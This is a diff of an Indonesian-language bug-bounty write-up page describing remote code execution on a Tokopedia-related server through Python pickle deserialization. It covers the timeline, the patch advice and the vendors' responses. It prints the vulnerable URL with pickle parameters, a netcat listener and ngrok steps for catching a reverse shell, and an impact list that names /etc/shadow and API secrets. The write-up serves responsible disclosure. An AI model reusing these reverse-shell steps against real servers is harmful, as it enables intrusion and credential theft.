@@ -15,22 +15,22 @@
 -->
 <head>
 <meta charset="utf-8">
-<title>HOW I HACK TOKOPEDIA (THIRD PARTY SERVER) WITH PICKLE OBJECT &vert; @ABDILAHRF</title>
-<meta name="description" content="How I Hack Tokopedia (third party server) with pickle object">
+<title>HOW I HACK TOKOPEDIA (3RD SERVER) WITH OBJECT DE-SERIALIZATION &vert; @ABDILAHRF</title>
+<meta name="description" content="How I Hack Tokopedia (3rd server) with Object de-Serialization">
 <meta name="keywords" content="Bugbounty">
 
 <!-- Twitter Cards -->
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://localhost:4000/images/logo.png">
-<meta name="twitter:title" content="How I Hack Tokopedia (third party server) with pickle object">
-<meta name="twitter:description" content="How I Hack Tokopedia (third party server) with pickle object">
+<meta name="twitter:title" content="How I Hack Tokopedia (3rd server) with Object de-Serialization">
+<meta name="twitter:description" content="How I Hack Tokopedia (3rd server) with Object de-Serialization">
 <meta name="twitter:creator" content="@abdilahrf">
 
 <!-- Open Graph -->
 <meta property="og:locale" content="en_US">
 <meta property="og:type" content="article">
-<meta property="og:title" content="How I Hack Tokopedia (third party server) with pickle object">
-<meta property="og:description" content="How I Hack Tokopedia (third party server) with pickle object">
+<meta property="og:title" content="How I Hack Tokopedia (3rd server) with Object de-Serialization">
+<meta property="og:description" content="How I Hack Tokopedia (3rd server) with Object de-Serialization">
 <meta property="og:url" content="http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize">
 <meta property="og:site_name" content="@abdilahrf">
 <meta property="og:image" content="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460">
@@ -49,7 +49,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
 
 
-    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,600,300,800,700' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,600,300,800,700' rel='stylesheet' type='text/css'>
 	<link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/font-awesome.min.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/normalize.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/nprogress.css">
@@ -122,8 +122,8 @@
                 <div class="notepad-post-title-simple row">
                     <div class="small-12 columns">
                         <div class="notepad-post-meta-simple">
-                            <h1>How I Hack Tokopedia (third party server) with pickle object</h1>
-                            <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#Bugbounty" data-toggle="tooltip" title="Posts tagged with Bugbounty" rel="tag">Bugbounty</a> <strong><time datetime="2018-09-10T00:00:00+07:00">10 Sep 2018</time></strong></p>
+                            <h1>How I Hack Tokopedia (3rd server) with Object de-Serialization</h1>
+                            <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#Bugbounty" data-toggle="tooltip" title="Posts tagged with Bugbounty" rel="tag">Bugbounty</a> <strong><time datetime="2018-11-21T00:00:00+07:00">21 Nov 2018</time></strong></p>
                         </div>
                     </div>
                 </div>
@@ -136,7 +136,7 @@
 
 <h3 id="apa-dampaknya-">Apa Dampaknya ?</h3>
 <hr />
-<p>Attacker dapat menjalankan perintah pada sistem dengan hak akses root.</p>
+<p>Attacker dapat menjalankan perintah pada sistem dengan hak akses root dengan kemungkinan eskalasi ke sistem internal yang lain dan juga dapat memanfaatkan semua credentials yang ada pada mesin tersebut seperti <code class="highlighter-rouge">/etc/shadow | database | email services | API SECRET | etc </code>.</p>
 
 <p><img width="400px" src="https://media.giphy.com/media/1dIo6kDOPMzsnMOJTj/giphy.gif" /></p>
 
@@ -151,7 +151,7 @@
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://explorer.tokopedia.com/v1/emailclick?em=1337%40gmail.com&amp;user_id=S%27%5Cx8d%5Cxe9%5Cxd1Y%5Cxdb%5Cx10%5Ct%5Cx92%5Cxd2%5Cx10%5Cx80%5Cxd7%5Cx9d%5Cxa4%5Cxc7%5Cx9eM_%2A+%5Cxc6%2C%5Cxb6%5Cx91%5Cx98%5Cxe0%5Cxben%5Cxfe%5Cxda%5Cxfa%5Cxf4%27%0Ap0%0A.&amp;d=S%27G%5Cxdfy%5Cxf5%5Cx00%5Cxe2G%5Cxe9F%5Cx91Gi%5Cx8d%5Crr%5Cxeb%5Cxf9%5Cxb6%5Cx87%5Cx99%60%27%0Ap0%0A.&amp;ts=1536374957&amp;cid=S%27%5Cxdd%5Cxe2%5Cx93%5Cx93i%5Cx0b%5Cx00%3Dd%5Cxac%24%2C%5Cxfah%5Cx91%5Cxc9Cz%5Cxc9%5Cxc65%5Cxef%5Cx81%5Cx04%5Cx84%5Cxc4-%5Cxaf%5Cxa44%5Cxe2%5Cx10ee%22%5Cxeb%5Cx0b%5Cx16N%3C%5Cxec%5Cx16%2Cs%5Cxa8%5Cxe3%5Cxaf.%5Cxe4A%5Cxc5Q%27%0Ap0%0A.&amp;ut=l&amp;moeclickid=5b93333e7da87848b22e8659_F_T_EM_AB_0_P_0_L_0ecli48&amp;app_id=S%27%60%5Cx8ele_%5Cx8ao%5Cxb4%5Cx9dJ%5Cr%5Cx01%5Cxee%5Cx80%5Cxbc%5Cx8ck%5Cxd7%5Cx83%2FUk%60%5Cxfe%5Cx16%5Cxd7+%5Cxa5%5Cx90%5D%5Cxda%5Cx93%27%0Ap0%0A.&amp;pl=A&amp;c_t=ge&amp;rlink=https://tokopedia.link/EBxQm0a00P?$deep_link=true%26utm_source=7teOvA%26utm_medium=email%26utm_campaign=co_OFS_BR_982018_Compilation%26utm_content=C3
 </code></pre></div></div>
 
-<p>Ada beberapa parameter yang menarik karena setelah saya lakukan url-decode ternyata yang dikirim adalah dalam bentuk Pickle String Python jadi karena seperti yang kita ketahu pada dokumentasi python sendiri Pickle sudah di warning agar tidak menerima input dari user karena dapat di-abuse untuk mendapatkan akses kepada sistem</p>
+<p>Ada beberapa parameter yang menarik karena setelah saya lakukan url-decode ternyata yang dikirim adalah dalam bentuk Pickle String Python jadi karena seperti yang kita ketahui pada dokumentasi python sendiri Pickle sudah di <a href="#warning">warning</a> agar tidak menerima input dari user karena dapat di-abuse untuk mendapatkan akses kepada sistem</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user_id=S%27%5Cx8d%5Cxe9%5Cxd1Y%5Cxdb%5Cx10%5Ct%5Cx92%5Cxd2%5Cx10%5Cx80%5Cxd7%5Cx9d%5Cxa4%5Cxc7%5Cx9eM_%2A+%5Cxc6%2C%5Cxb6%5Cx91%5Cx98%5Cxe0%5Cxben%5Cxfe%5Cxda%5Cxfa%5Cxf4%27%0Ap0%0A.
 d=S%27G%5Cxdfy%5Cxf5%5Cx00%5Cxe2G%5Cxe9F%5Cx91Gi%5Cx8d%5Crr%5Cxeb%5Cxf9%5Cxb6%5Cx87%5Cx99%60%27%0Ap0%0A.
@@ -170,9 +170,9 @@ p0
 
 <p>Dari melihat struktur data tersebut sudah bisa ditebak bahwa itu pickle strings yang akan dikirimkan melalui parameter yang vulnerable tersebut, dengan melakukan modifikasi pada pickle strings yang dikirimkan saya bisa mendapatkan reverse shell untuk akses server tokopedia secara penuh.</p>
 
-<p>untuk melakukan reverse shell kita dapat membuat listener menggunakan nc <code class="highlighter-rouge">nc -lvp 8080</code>, karena ip address saya tidak memiliki public ip maka saya menggunakan ngrok untuk melakukan tuneling dengan <code class="highlighter-rouge">./ngrok.exe tcp 8080</code> kemudian kita dapat mengakses ngrok pada <code class="highlighter-rouge">localhost:4040</code> untuk mendapatkan public address yang di assign ngrok.</p>
+<p>untuk melakukan reverse shell kita dapat membuat listener menggunakan nc <code class="highlighter-rouge">nc -lvp 8080</code>, karena ip address saya tidak memiliki public ip maka saya menggunakan <a href="https://ngrok.com">ngrok</a> untuk melakukan tuneling dengan <code class="highlighter-rouge">./ngrok.exe tcp 8080</code> kemudian kita dapat mengakses ngrok pada <code class="highlighter-rouge">localhost:4040</code> untuk mendapatkan public address yang di assign ngrok.</p>
 
-<p>untuk membuat payload reverse shell dengan cPickle saya gunakan script python dibawah, kemudian output dari script ini dimasukan kedalam salah satu parameter yang vulnerable diatas yaitu <code class="highlighter-rouge">user_id | d | cid | app_id</code> salah satu parameter saja.</p>
+<p>untuk membuat payload reverse shell dengan cPickle saya membuat script exploit python dibawah ini, kemudian output dari script ini dimasukan kedalam salah satu parameter yang vulnerable diatas yaitu <code class="highlighter-rouge">user_id | d | cid | app_id</code> salah satu parameter saja.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 
@@ -222,10 +222,30 @@ Cookie: [..REDACTED..]
 <h3 id="how-to-patch-">HOW TO PATCH ?</h3>
 <hr />
 <p>Jangan memasukan input user kedalam <code class="highlighter-rouge">cPickle.load[s]?()</code> atau <code class="highlighter-rouge">pickle.load[s]?()</code> seperti yang sudah di jelaskan pada dokumentasi python sendiri <a href="https://docs.python.org/3/library/pickle.html">https://docs.python.org/3/library/pickle.html</a>.</p>
+<div id="warning">
+<center><img src="/images/tokopedia/pythonpickle.png" /></center>
+</div>
+<p><br /><br /></p>
 
-<p><img src="/images/tokopedia/pythonpickle.png" alt="PICKLE WARNING" /></p>
+<h3 id="response-from-it-security-tokopedia">Response From IT Security Tokopedia</h3>
+<hr />
+<p>Response dari tokopedia</p>
 
-<h3 id="timeline--bonus-content-dlc">TIMELINE &amp; BONUS CONTENT (DLC)</h3>
+<p><img src="/images/tokopedia/tokopedia-response.PNG" alt="Response from tokopedia" /></p>
+
+<p>Karena dari pihak tokopedia menyatakan kalau <code class="highlighter-rouge">explorer.tokopedia.com</code> menggunakan service dari <code class="highlighter-rouge">branch.io</code> maka saya mengambil inisiatif untuk bertanya langsung kepada pihak <code class="highlighter-rouge">branch.io</code> melalui email dan dari <code class="highlighter-rouge">branch.io</code> sendiri mengklarifikasi bahwa server <code class="highlighter-rouge">explorer.tokopedia.com</code> tidak menggunakan service dari <code class="highlighter-rouge">branch.io</code>.</p>
+
+<h3 id="response-from-branchio">Response From Branch.io</h3>
+<hr />
+<p>Response dari branch.io</p>
+
+<p><img src="/images/tokopedia/branchio-response.PNG" alt="Response From Branchio" /></p>
+
+<p>setelah tokopedia memberitahu bahwa <strong>Server</strong> dan <strong>Aplikasi</strong> yang terkena serangan RCE adalah milik <code class="highlighter-rouge">branch.io</code> kemudian saya coba laporkan celah keamanan tersebut kepada <code class="highlighter-rouge">branch.io</code> dan diresponse kalau <code class="highlighter-rouge">explorer.tokopedia.com</code> tidak menggunakan service dari <code class="highlighter-rouge">branch.io</code> dan saya juga tidak bisa melakukan reproduce bug pada <code class="highlighter-rouge">branch.io</code> ╮(╯∀╰)╭ .</p>
+
+<p>kemudian setelah beberapa bulan saya menemukan bahwa kelemahannya ada di moengage.com namun ketika saya coba lagi ternyata bugnya telah di patch secara <em>misterius</em> ლ(ﾟдﾟლ) ლ(ﾟдﾟლ) oleh moengage dan parameternya sudah di encrypt menggunakan enkripsi (ಥ﹏ಥ).</p>
+
+<h3 id="timeline--poc-video">TIMELINE &amp; POC Video</h3>
 <hr />
 
 <table>
@@ -249,11 +269,11 @@ Cookie: [..REDACTED..]
       <td>Tokopedia take down the endpoint</td>
     </tr>
     <tr>
-      <td>10 September 2018 3:59 PM</td>
-      <td>Rewarded</td>
+      <td>21 November 2018 11:00 AM</td>
+      <td>Rewarded $137</td>
     </tr>
     <tr>
-      <td>10 September 2018 20:00 PM</td>
+      <td>21 November 2018 21:00 PM</td>
       <td>Public Disclose</td>
     </tr>
   </tbody>
@@ -261,20 +281,17 @@ Cookie: [..REDACTED..]
 
 <hr />
 
-<ul>
-  <li>Youtube : https://youtu.be/Fo6Emx-LMQE</li>
-</ul>
+<p><code class="highlighter-rouge">POC Video : https://youtu.be/Fo6Emx-LMQE</code></p>
 
 <p><em>That’s all folks!</em></p>
 
 <p><img src="https://media.giphy.com/media/XreQmk7ETCak0/giphy.gif" width="300px" /></p>
-
 </div>
         </article>
         <div class="cf"></div>
         <div class="row text-center">
             <section class="notepad-post-share">
-                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;How I Hack Tokopedia (third party server) with pickle object&quot;%20http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize%20via%20&#64;abdilahrf"
+                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;How I Hack Tokopedia (3rd server) with Object de-Serialization&quot;%20http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize%20via%20&#64;abdilahrf"
                     onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
                     <i class="fa fa-twitter"></i>
                 </a>
